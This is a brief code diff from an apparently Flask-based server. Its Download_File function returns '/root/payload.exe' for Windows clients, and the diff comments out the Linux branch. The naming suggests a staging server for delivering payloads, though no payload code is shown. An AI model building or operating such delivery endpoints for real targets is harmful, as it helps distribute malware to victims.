@@ -26,8 +26,8 @@ def SHA512(value):
 def Download_File(value):
     if value == "win":
         return send_file(open('/root/payload.exe', 'r'))
-    elif value == "liunx":
-        return send_file(open('/root/payload', 'r'))
+    #elif value == "liunx":
+        #return send_file(open('/root/payload', 'r'))
     else:
         return jsonify({'Platform Not Found': 404})
 
